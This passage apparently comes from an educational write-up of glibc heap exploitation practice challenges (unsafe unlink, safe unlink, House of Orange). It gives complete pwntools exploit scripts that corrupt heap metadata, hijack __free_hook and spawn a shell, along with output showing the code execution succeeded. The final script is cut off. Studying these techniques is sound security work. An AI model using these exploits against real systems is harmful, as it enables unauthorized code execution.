</details>






  
  
    

  
  
    







<div><pre tabindex="0"><code data-lang="text"><span><span>b&#39;uid=1000(pwny) gid=100(users) groups=100(users),1(wheel)\n&#39;</span></span></code></pre></div>

<h2 id="unsafe-unlink">Unsafe unlink</h2>
<p>When a “normal” chunk is freed, it is added to the unsortedbin doubly linked list; this behaves very similarly to the fastbins, except there’s now an additional <kbd>bk</kbd> pointer stored after the <kbd>fd</kbd> pointer.</p>
<p>But having a bunch of randomly sized chunks in a freelist is not really ideal, as we’d like to be able to reclaim these chunks and use them for even larger allocations.
Enter chunk consolidation—when a chunk is freed, malloc will check if the chunk’s neighboring chunks are also freed, in which case malloc will backwards and/or forwards consolidate the chunks into a single larger chunk.
But a freed chunk is still inside the unsortedbin we talked about earlier, so before this consolidation can occur malloc has to unlink one or more nodes from the unsortedbin linked list (as the chunk being freed is merged with one or both of its neighboring chunks).</p>
<p>In older versions of Glibc this linked list unlinking was not performed safely, so by corrupting heap chunks one could leverage this chunk consolidation for a (somewhat constrained) reflected write.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<h3 id="solve">Solve</h3>
<p>In this challenge we can write 8 bytes past the end of our requested size, which we can use to corrupt the next chunk’s size field <span>and flags</span>.</p>
<p>By clearing chunk B’s <kbd>prev_inuse</kbd> flag, we can convince malloc that the chunk before chunk B (chunk A) is freed for the purposes of chunk consolidation when chunk B is freed.
When we free chunk B, malloc will attempt to unlink chunk A from the unsortedbin freelist by setting <span data-lang="c"><code>chunk_a.bk-&gt;fd = chunk_a.fd</code></span> and <span data-lang="c"><code>chunk_a.fd-&gt;bk = chunk_a.bk</code></span> (using temporary variables where appropriate):</p>





  
  
    

  
  
    







<details open="">
  <summary>C</summary>
  <div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span>1413
</span><span>1414
</span><span>1415
</span><span>1416
</span><span>1417
</span><span>1418
</span><span>1419
</span><span>1420
</span><span>1421
</span><span>1422
</span><span>1423
</span><span>1424
</span><span>1425
</span><span>1426
</span><span>1427
</span><span>1428
</span><span>1429
</span><span>1430
</span><span>1431
</span><span>1432
</span><span>1433
</span><span>1434
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="c"><span><span><span>#define unlink(AV, P, BK, FD) {\
</span></span></span><span><span><span>    FD = P-&gt;fd;\
</span></span></span><span><span><span>    BK = P-&gt;bk;\
</span></span></span><span><span><span>    FD-&gt;bk = BK;\
</span></span></span><span><span><span>    BK-&gt;fd = FD;\
</span></span></span><span><span><span>    if (!in_smallbin_range (P-&gt;size)\
</span></span></span><span><span><span>        &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {\
</span></span></span><span><span><span>            if (FD-&gt;fd_nextsize == NULL) {\
</span></span></span><span><span><span>                if (P-&gt;fd_nextsize == P)\
</span></span></span><span><span><span>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\
</span></span></span><span><span><span>                else {\
</span></span></span><span><span><span>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\
</span></span></span><span><span><span>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\
</span></span></span><span><span><span>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\
</span></span></span><span><span><span>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\
</span></span></span><span><span><span>                }\
</span></span></span><span><span><span>            } else {\
</span></span></span><span><span><span>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\
</span></span></span><span><span><span>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\
</span></span></span><span><span><span>            }\
</span></span></span><span><span><span>    }\
</span></span></span><span><span><span>}</span></span></span></code></pre></td></tr></tbody></table>
</div>
</div>
</details>

<p>With that in mind the exploit is pretty straightforward.
Unfortunately I can’t use the OG method of writing shellcode on the heap because in QEMU/Rosetta the heap isn’t marked executable (even though the stack is—weird), and we can’t use a one_gadget because Glibc <code>.text</code> isn’t writable:</p>





  
  
    

  
  
    







<div><pre tabindex="0"><code data-lang="text"><span><span>[*] &#39;./unsafe_unlink&#39;
</span></span><span><span>    Arch:       amd64-64-little
</span></span><span><span>    RELRO:      Full RELRO
</span></span><span><span>    Stack:      Canary found
</span></span><span><span>    NX:         NX unknown - GNU_STACK missing
</span></span><span><span>    PIE:        PIE enabled
</span></span><span><span>    Stack:      Executable
</span></span><span><span>    RWX:        Has RWX segments
</span></span><span><span>    RUNPATH:    b&#39;../.glibc/glibc_2.23_unsafe-unlink&#39;
</span></span><span><span>    Stripped:   No
</span></span><span><span>    Debuginfo:  Yes</span></span></code></pre></div>






  
  
    

  
  
    







<details open="">
  <summary>Python</summary>
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;unsafe_unlink&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>malloc</span>(size):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;1&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;size: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>size<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>edit</span>(index, data):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;2&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;data: &#34;</span>, data)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>free</span>(index):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;3&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span>proc <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;puts() @ &#34;</span>)
</span></span><span><span>libc<span>.</span>address <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>) <span>-</span> libc<span>.</span>sym<span>.</span>puts
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;heap @ &#34;</span>)
</span></span><span><span>heap <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>proc<span>.</span>timeout <span>=</span> <span>0.5</span>
</span></span><span><span>
</span></span><span><span>shellcode <span>=</span> flat(
</span></span><span><span>    asm(<span>&#34;jmp .+18&#34;</span>),
</span></span><span><span>    p64(<span>0</span>),
</span></span><span><span>    p64(<span>0</span>),
</span></span><span><span>    asm(shellcraft<span>.</span>amd64<span>.</span>linux<span>.</span>sh())
</span></span><span><span>)
</span></span><span><span><span># start of the heap plus the size, fd, and bk fields of chunk A</span>
</span></span><span><span>shellcode_addr <span>=</span> heap <span>+</span> <span>8</span> <span>+</span> <span>8</span> <span>+</span> <span>8</span> <span>+</span> <span>8</span>
</span></span><span><span>
</span></span><span><span>malloc(<span>0x3f0</span><span>-</span><span>8</span>) <span># chunk A</span>
</span></span><span><span>malloc(<span>0x3f0</span><span>-</span><span>8</span>) <span># chunk B</span>
</span></span><span><span>edit(<span>0</span>, p64(libc<span>.</span>sym<span>.</span>__free_hook<span>-</span><span>0x18</span>) <span>+</span> p64(shellcode_addr) <span>+</span> shellcode <span>+</span> <span>b</span><span>&#34;A&#34;</span><span>*</span>(<span>0x3f0</span><span>-</span><span>8</span><span>-</span><span>8</span><span>-</span><span>len</span>(shellcode)<span>-</span><span>8</span><span>-</span><span>8</span>) <span>+</span> p64(<span>0x3f0</span>) <span>+</span> p64((<span>0x3f0</span>) <span>&amp;</span> <span>~</span><span>0b111</span>))
</span></span><span><span>free(<span>1</span>) <span># trigger unlink of chunk A</span>
</span></span><span><span>
</span></span><span><span>free(<span>0</span>) <span># trigger __free_hook</span>
</span></span><span><span>
</span></span><span><span>proc<span>.</span>sendline(<span>b</span><span>&#34;id&#34;</span>)
</span></span><span><span><span>print</span>(proc<span>.</span>recvall())</span></span></code></pre></div>
</details>

<h2 id="safe-unlink">Safe unlink</h2>
<p>This is effectively the same as <a href="#unsafe-unlink">unsafe unlink</a>, except now integrity checks have been introduced to the unlinking process that thwart our previous approach:</p>





  
  
    

  
  
    







<details open="">
  <summary>C</summary>
  <div><div>
<table><tbody><tr><td>
<pre tabindex="0"><code><span id="org-coderef--04d0d8-1449"><a href="#org-coderef--04d0d8-1449">1449</a>
</span><span id="org-coderef--04d0d8-1450"><a href="#org-coderef--04d0d8-1450">1450</a>
</span><span id="org-coderef--04d0d8-1451"><a href="#org-coderef--04d0d8-1451">1451</a>
</span><span id="org-coderef--04d0d8-1452"><a href="#org-coderef--04d0d8-1452">1452</a>
</span><span id="org-coderef--04d0d8-1453"><a href="#org-coderef--04d0d8-1453">1453</a>
</span><span id="org-coderef--04d0d8-1454"><a href="#org-coderef--04d0d8-1454">1454</a>
</span><span id="org-coderef--04d0d8-1455"><a href="#org-coderef--04d0d8-1455">1455</a>
</span><span id="org-coderef--04d0d8-1456"><a href="#org-coderef--04d0d8-1456">1456</a>
</span><span id="org-coderef--04d0d8-1457"><a href="#org-coderef--04d0d8-1457">1457</a>
</span><span id="org-coderef--04d0d8-1458"><a href="#org-coderef--04d0d8-1458">1458</a>
</span><span id="org-coderef--04d0d8-1459"><a href="#org-coderef--04d0d8-1459">1459</a>
</span><span id="org-coderef--04d0d8-1460"><a href="#org-coderef--04d0d8-1460">1460</a>
</span><span id="org-coderef--04d0d8-1461"><a href="#org-coderef--04d0d8-1461">1461</a>
</span><span id="org-coderef--04d0d8-1462"><a href="#org-coderef--04d0d8-1462">1462</a>
</span><span id="org-coderef--04d0d8-1463"><a href="#org-coderef--04d0d8-1463">1463</a>
</span><span id="org-coderef--04d0d8-1464"><a href="#org-coderef--04d0d8-1464">1464</a>
</span><span id="org-coderef--04d0d8-1465"><a href="#org-coderef--04d0d8-1465">1465</a>
</span><span id="org-coderef--04d0d8-1466"><a href="#org-coderef--04d0d8-1466">1466</a>
</span><span id="org-coderef--04d0d8-1467"><a href="#org-coderef--04d0d8-1467">1467</a>
</span><span id="org-coderef--04d0d8-1468"><a href="#org-coderef--04d0d8-1468">1468</a>
</span><span id="org-coderef--04d0d8-1469"><a href="#org-coderef--04d0d8-1469">1469</a>
</span><span id="org-coderef--04d0d8-1470"><a href="#org-coderef--04d0d8-1470">1470</a>
</span><span id="org-coderef--04d0d8-1471"><a href="#org-coderef--04d0d8-1471">1471</a>
</span><span id="org-coderef--04d0d8-1472"><a href="#org-coderef--04d0d8-1472">1472</a>
</span><span id="org-coderef--04d0d8-1473"><a href="#org-coderef--04d0d8-1473">1473</a>
</span><span id="org-coderef--04d0d8-1474"><a href="#org-coderef--04d0d8-1474">1474</a>
</span><span id="org-coderef--04d0d8-1475"><a href="#org-coderef--04d0d8-1475">1475</a>
</span><span id="org-coderef--04d0d8-1476"><a href="#org-coderef--04d0d8-1476">1476</a>
</span><span id="org-coderef--04d0d8-1477"><a href="#org-coderef--04d0d8-1477">1477</a>
</span><span id="org-coderef--04d0d8-1478"><a href="#org-coderef--04d0d8-1478">1478</a>
</span><span id="org-coderef--04d0d8-1479"><a href="#org-coderef--04d0d8-1479">1479</a>
</span><span id="org-coderef--04d0d8-1480"><a href="#org-coderef--04d0d8-1480">1480</a>
</span><span id="org-coderef--04d0d8-1481"><a href="#org-coderef--04d0d8-1481">1481</a>
</span><span id="org-coderef--04d0d8-1482"><a href="#org-coderef--04d0d8-1482">1482</a>
</span><span id="org-coderef--04d0d8-1483"><a href="#org-coderef--04d0d8-1483">1483</a>
</span><span id="org-coderef--04d0d8-1484"><a href="#org-coderef--04d0d8-1484">1484</a>
</span><span id="org-coderef--04d0d8-1485"><a href="#org-coderef--04d0d8-1485">1485</a>
</span><span id="org-coderef--04d0d8-1486"><a href="#org-coderef--04d0d8-1486">1486</a>
</span><span id="org-coderef--04d0d8-1487"><a href="#org-coderef--04d0d8-1487">1487</a>
</span><span id="org-coderef--04d0d8-1488"><a href="#org-coderef--04d0d8-1488">1488</a>
</span></code></pre></td>
<td>
<pre tabindex="0"><code data-lang="c"><span><span><span>/* Take a chunk off a bin list.  */</span>
</span></span><span><span><span>static</span> <span>void</span>
</span></span><span><span><span>unlink_chunk</span> (mstate av, mchunkptr p)
</span></span><span><span>{
</span></span><span><span>  <span>if</span> (<span>chunksize</span> (p) <span>!=</span> <span>prev_size</span> (<span>next_chunk</span> (p)))
</span></span><span><span>    <span>malloc_printerr</span> (<span>&#34;corrupted size vs. prev_size&#34;</span>);
</span></span><span><span>
</span></span><span><span>  mchunkptr fd <span>=</span> p<span>-&gt;</span>fd;
</span></span><span><span>  mchunkptr bk <span>=</span> p<span>-&gt;</span>bk;
</span></span><span><span>
</span></span><span><span>  <span>if</span> (<span>__builtin_expect</span> (fd<span>-&gt;</span>bk <span>!=</span> p <span>||</span> bk<span>-&gt;</span>fd <span>!=</span> p, <span>0</span>))
</span></span><span><span>    <span>malloc_printerr</span> (<span>&#34;corrupted double-linked list&#34;</span>);
</span></span><span><span>
</span></span><span><span>  fd<span>-&gt;</span>bk <span>=</span> bk;
</span></span><span><span>  bk<span>-&gt;</span>fd <span>=</span> fd;
</span></span><span><span>  <span>if</span> (<span>!</span><span>in_smallbin_range</span> (<span>chunksize_nomask</span> (p)) <span>&amp;&amp;</span> p<span>-&gt;</span>fd_nextsize <span>!=</span> <span>NULL</span>)
</span></span><span><span>    {
</span></span><span><span>      <span>if</span> (p<span>-&gt;</span>fd_nextsize<span>-&gt;</span>bk_nextsize <span>!=</span> p
</span></span><span><span>	  <span>||</span> p<span>-&gt;</span>bk_nextsize<span>-&gt;</span>fd_nextsize <span>!=</span> p)
</span></span><span><span>	<span>malloc_printerr</span> (<span>&#34;corrupted double-linked list (not small)&#34;</span>);
</span></span><span><span>
</span></span><span><span>      <span>if</span> (fd<span>-&gt;</span>fd_nextsize <span>==</span> <span>NULL</span>)
</span></span><span><span>	{
</span></span><span><span>	  <span>if</span> (p<span>-&gt;</span>fd_nextsize <span>==</span> p)
</span></span><span><span>	    fd<span>-&gt;</span>fd_nextsize <span>=</span> fd<span>-&gt;</span>bk_nextsize <span>=</span> fd;
</span></span><span><span>	  <span>else</span>
</span></span><span><span>	    {
</span></span><span><span>	      fd<span>-&gt;</span>fd_nextsize <span>=</span> p<span>-&gt;</span>fd_nextsize;
</span></span><span><span>	      fd<span>-&gt;</span>bk_nextsize <span>=</span> p<span>-&gt;</span>bk_nextsize;
</span></span><span><span>	      p<span>-&gt;</span>fd_nextsize<span>-&gt;</span>bk_nextsize <span>=</span> fd;
</span></span><span><span>	      p<span>-&gt;</span>bk_nextsize<span>-&gt;</span>fd_nextsize <span>=</span> fd;
</span></span><span><span>	    }
</span></span><span><span>	}
</span></span><span><span>      <span>else</span>
</span></span><span><span>	{
</span></span><span><span>	  p<span>-&gt;</span>fd_nextsize<span>-&gt;</span>bk_nextsize <span>=</span> p<span>-&gt;</span>bk_nextsize;
</span></span><span><span>	  p<span>-&gt;</span>bk_nextsize<span>-&gt;</span>fd_nextsize <span>=</span> p<span>-&gt;</span>fd_nextsize;
</span></span><span><span>	}
</span></span><span><span>    }
</span></span><span><span>}</span></span></code></pre></td></tr></tbody></table>
</div>
</div>
</details>

<p>Basically, the addresses we’re writing to <a href="#org-coderef--04d0d8-1459">actually need to point to our chunk</a>, which severely limits our options.
But as it turns out, <kbd>unlink_chunk</kbd> can still be leveraged for an arbitrary write, but in a way that’s very specific to our target binary.</p>
<h3 id="solve">Solve</h3>
<p>In our binary there exists a global variable <kbd>m_array</kbd> that has pointers to the chunks we’re allocating on the heap.</p>
<p>We can craft a fake freed chunk A with <kbd>fd</kbd> and <kbd>bk</kbd> pointers that point to <kbd>m_array[0]</kbd>, which in turn points back to chunk A, thus passing the integrity checks.
As an additional complication we can’t free chunk A as-is, but that’s fine—we can create a smaller fake chunk within chunk A and use that.</p>
<p>This has the effect of clobbering <kbd>m_array[0].user_data</kbd> to point to itself; when we try to <kbd>edit</kbd> chunk A, we’re actually editing <kbd>m_array[0]</kbd>.
From there we can overwrite <kbd>m_array[0].user_data</kbd> to point to <kbd>__free_hook</kbd>, and <kbd>edit</kbd> “chunk A” once more to write a one_gadget.</p>
<p>Or so I thought, but as it turns out I couldn’t satisfy any of the conditions of the one_gadgets, even with <code>rdi</code>​/​<code>[rdi]</code> or <code>rax</code> control (by clobbering <kbd>m_chunk[1].user_data</kbd>).
But if we have an arbitrary write, we can just write <code>&#34;/bin/sh&#34;</code> at the start of our fake chunk and set <kbd>__free_hook</kbd> to <kbd>system</kbd>, nice and simple.</p>





  
  
    

  
  
    







<details open="">
  <summary>Python</summary>
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;safe_unlink&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>malloc</span>(size):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;1&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;size: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>size<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>edit</span>(index, data):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;2&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;data: &#34;</span>, data)
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>free</span>(index):
</span></span><span><span>    proc<span>.</span>send(<span>b</span><span>&#34;3&#34;</span>)
</span></span><span><span>    proc<span>.</span>sendafter(<span>b</span><span>&#34;index: &#34;</span>, <span>f</span><span>&#34;</span><span>{</span>index<span>}</span><span>&#34;</span><span>.</span>encode())
</span></span><span><span>    proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>
</span></span><span><span>proc <span>=</span> remote(<span>&#34;localhost&#34;</span>, <span>1337</span>)
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;puts() @ &#34;</span>)
</span></span><span><span>libc<span>.</span>address <span>=</span> <span>int</span>(proc<span>.</span>recvline(), <span>16</span>) <span>-</span> libc<span>.</span>sym<span>.</span>puts
</span></span><span><span>
</span></span><span><span>proc<span>.</span>recvuntil(<span>b</span><span>&#34;&gt; &#34;</span>)
</span></span><span><span>proc<span>.</span>timeout <span>=</span> <span>0.5</span>
</span></span><span><span>
</span></span><span><span>malloc(<span>0xa0</span><span>-</span><span>8</span>) <span># chunk A</span>
</span></span><span><span>malloc(<span>0x90</span><span>-</span><span>8</span>) <span># chunk B</span>
</span></span><span><span>edit(<span>0</span>, p64(<span>0</span>) <span>+</span> p64(<span>0x91</span>) <span>+</span> p64(elf<span>.</span>sym<span>.</span>m_array<span>-</span><span>0x18</span>) <span>+</span> p64(elf<span>.</span>sym<span>.</span>m_array<span>-</span><span>0x10</span>) <span>+</span> <span>b</span><span>&#34;A&#34;</span><span>*</span>(<span>0x90</span><span>-</span><span>8</span><span>-</span><span>8</span><span>-</span><span>8</span><span>-</span><span>8</span>) <span>+</span> p64(<span>0x90</span>) <span>+</span> p64((<span>0x90</span>) <span>&amp;</span> <span>~</span><span>0b111</span>))
</span></span><span><span>free(<span>1</span>) <span># trigger unlink of chunk A</span>
</span></span><span><span><span># m_array[0].user_data = &amp;m_array[0].user_data-0x18</span>
</span></span><span><span>edit(<span>0</span>, <span>b</span><span>&#34;</span><span>\x00</span><span>&#34;</span><span>*</span><span>0x18</span> <span>+</span> p64(libc<span>.</span>sym<span>.</span>__free_hook <span>-</span> <span>len</span>(<span>b</span><span>&#34;/bin/sh</span><span>\x00</span><span>&#34;</span>)))
</span></span><span><span><span># m_array[0].user_data = &amp;__free_hook-8</span>
</span></span><span><span>edit(<span>0</span>, <span>b</span><span>&#34;/bin/sh</span><span>\x00</span><span>&#34;</span> <span>+</span> p64(libc<span>.</span>sym<span>.</span>system))
</span></span><span><span>free(<span>0</span>) <span># trigger __free_hook with address to &#34;/bin/sh&#34; as argument</span>
</span></span><span><span>
</span></span><span><span>proc<span>.</span>sendline(<span>b</span><span>&#34;id&#34;</span>)
</span></span><span><span><span>print</span>(proc<span>.</span>recvline())</span></span></code></pre></div>
</details>






  
  
    

  
  
    







<div><pre tabindex="0"><code data-lang="text"><span><span>b&#39;uid=1000(pwny) gid=100(users) groups=100(users),1(wheel)\n&#39;</span></span></code></pre></div>

<h2 id="house-of-orange">House of Orange</h2>
<p>Fast forward to 2016 when the <a href="https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html">House of Orange</a> technique was introduced at HITCON CTF Quals.
This attack is a bit convoluted as it relies on internals of <kbd>_IO_FILE</kbd> for a specific version of Glibc, but the technique has pedagogical value for learning FSOP and the unsortedbin attack.</p>
<p>The prescient bit of information is that we can write the head of the unsortedbin (the first bin in <kbd>main_arena.bins</kbd>) freelist to an arbitrary address, where <kbd>main_arena.bins[0] == &amp;tail_of_unsortedbin</kbd>.
There doesn’t seem to be an immediately obvious utility aside from leaking a libc address, but we can sneakily replace a different linked list head in Glibc with the head of the unsortedbin linked list.</p>
<p>The big non-heap candidate here is <kbd>_IO_list_all</kbd>, which is a linked list of <kbd>_IO_FILE</kbd> structures for stdio (stdin/stdout/stderr).
In a similar vein to the malloc hooks, <kbd>_IO_FILE</kbd> (or technically <kbd>_IO_FILE_plus</kbd>) has a vtable pointer that could be clobbered, and just like malloc hooks, we can reliably trigger execution of one or more functions in this vtable (<kbd>_IO_flush_all_lockp</kbd> will traverse all the files in <kbd>_IO_list_all</kbd> and execute each <kbd>_IO_FILE</kbd>’s <kbd>__overflow</kbd> method; we can trigger this by intentionally failing a heap corruption check, which will <kbd>abort</kbd> which eventually calls <kbd>_IO_flush_all_lockp</kbd>).</p>





  
  
    

  
  
    







<details open="">
  <summary>C</summary>
  <div><pre tabindex="0"><code data-lang="c"><span><span><span>struct</span> _IO_FILE {
</span></span><span><span>  <span>int</span>                  _flags;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_read_ptr;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_read_end;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_read_base;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_write_base;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_write_ptr;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_write_end;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_buf_base;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_buf_end;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_save_base;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_backup_base;
</span></span><span><span>  <span>char</span> <span>*</span>               _IO_save_end;
</span></span><span><span>  <span>struct</span> _IO_marker <span>*</span> _markers;
</span></span><span><span>  <span>struct</span> _IO_FILE <span>*</span>   _chain;
</span></span><span><span>  <span>int</span>                 _fileno;
</span></span><span><span>  <span>int</span>                 _flags2;
</span></span><span><span>  __off_t             _old_offset; <span>// __off_t == long int
</span></span></span><span><span><span></span>  <span>unsigned</span> <span>short</span>      _cur_column;
</span></span><span><span>  <span>signed</span> <span>char</span>         _vtable_offset;
</span></span><span><span>  <span>char</span>                _shortbuf[<span>1</span>];
</span></span><span><span>  _IO_lock_t <span>*</span>        _lock;
</span></span><span><span>};
</span></span><span><span>
</span></span><span><span><span>struct</span> _IO_FILE_complete {
</span></span><span><span>  <span>struct</span> _IO_FILE _file;
</span></span><span><span>  __off64_t       _offset;
</span></span><span><span>  <span>void</span> <span>*</span>          __pad1;
</span></span><span><span>  <span>void</span> <span>*</span>          __pad2;
</span></span><span><span>  <span>void</span> <span>*</span>          __pad3;
</span></span><span><span>  <span>void</span> <span>*</span>          __pad4;
</span></span><span><span>  <span>size_t</span>          __pad5;
</span></span><span><span>  <span>int</span>             _mode;
</span></span><span><span>  <span>char</span>            _unused2[<span>20</span>];
</span></span><span><span>};
</span></span><span><span>
</span></span><span><span><span>struct</span> _IO_jump_t {
</span></span><span><span>  <span>size_t</span>           __dummy;
</span></span><span><span>  <span>size_t</span>           __dummy2;
</span></span><span><span>  <span>/* these are all function pointers */</span>
</span></span><span><span>  _IO_finish_t     __finish;
</span></span><span><span>  _IO_overflow_t   __overflow;
</span></span><span><span>  _IO_underflow_t  __underflow;
</span></span><span><span>  _IO_underflow_t  __uflow;
</span></span><span><span>  _IO_pbackfail_t  __pbackfail;
</span></span><span><span>  _IO_xsputn_t     __xsputn;
</span></span><span><span>  _IO_xsgetn_t     __xsgetn;
</span></span><span><span>  _IO_seekoff_t    __seekoff;
</span></span><span><span>  _IO_seekpos_t    __seekpos;
</span></span><span><span>  _IO_setbuf_t     __setbuf;
</span></span><span><span>  _IO_sync_t       __sync;
</span></span><span><span>  _IO_doallocate_t __doallocate;
</span></span><span><span>  _IO_read_t       __read;
</span></span><span><span>  _IO_write_t      __write;
</span></span><span><span>  _IO_seek_t       __seek;
</span></span><span><span>  _IO_close_t      __close;
</span></span><span><span>  _IO_stat_t       __stat;
</span></span><span><span>  _IO_showmanyc_t  __showmanyc;
</span></span><span><span>  _IO_imbue_t      __imbue;
</span></span><span><span>};
</span></span><span><span>
</span></span><span><span><span>struct</span> _IO_FILE_plus {
</span></span><span><span>  <span>struct</span> _IO_FILE_complete  file;
</span></span><span><span>  <span>const</span> <span>struct</span> _IO_jump_t <span>*</span> vtable;
</span></span><span><span>};</span></span></code></pre></div>
</details>

<h3 id="solve">Solve</h3>
<p>There are three “phases” to our House of Orange attack (phases two and three happen at the same time but I think it’s helpful to mentally separate them):</p>
<ol>
<li>Clobber top chunk’s <kbd>size</kbd> field to a small page-aligned value and request a chunk larger than the top chunk can service.
This causes malloc to call <kbd>sbrk</kbd> for a new top chunk that can service the request, and the old top chunk is added to the unsortedbin freelist (it doesn’t get extended/consolidated because the new top chunk is not contiguous with the old one).</li>
<li>Overwrite the old top chunk’s <kbd>bk</kbd> pointer to 16 bytes before <kbd>_IO_list_all</kbd>; when we next request a chunk, <kbd>_IO_list_all</kbd> will be clobbered with <kbd>main_arena.bins[0]-0x10</kbd> (aka the head of the unsortedbin freelist).</li>
<li>In addition to overwriting the old top chunk’s <kbd>bk</kbd> pointer, also construct a fake <kbd>_IO_FILE_plus</kbd> (and stuff in a <kbd>_IO_jump_t</kbd> somewhere) that coincides with the old top chunk.
There will be a few very basic checks against our fake <kbd>_IO_FILE_plus</kbd>, so be sure to pass those.
This has the secondary effect of corrupting the heap, which will call <kbd>(fake_filep-&gt;vtable.__overflow)(&amp;fake_filep, -1)</kbd>; because <kbd>fake_filep-&gt;vtable.__overflow</kbd> is set to <kbd>system</kbd> and <kbd>flags</kbd> is set to <code>&#34;/bin/sh&#34;</code> (<kbd>flags</kbd> is the first member of <kbd>_IO_FILE</kbd>, so <kbd>&amp;fake_filep == &amp;fake_filep.flags</kbd>), this calls <kbd>system(&#34;/bin/sh&#34;)</kbd>.</li>
</ol>
<!--listend-->





  
  
    

  
  
    







<details open="">
  <summary>Python</summary>
  <div><pre tabindex="0"><code data-lang="python"><span><span><span>from</span> pwn <span>import</span> <span>*</span>
</span></span><span><span>
</span></span><span><span>context<span>.</span>log_level <span>=</span> <span>&#39;warning&#39;</span>
</span></span><span><span>
</span></span><span><span>elf <span>=</span> context<span>.</span>binary <span>=</span> ELF(<span>&#34;house_of_orange&#34;</span>)
</span></span><span><span>libc <span>=</span> ELF(elf<span>.</span>runpath <span>+</span> <span>b</span><span>&#34;/libc.so.6&#34;</span>)
</span></span><span><span>
</span></span><span><span><span>def</span> <span>malloc</span>(size):
</span></span><span><span>    <span>if</span> size <span>==</span> <span>0x18</span>:
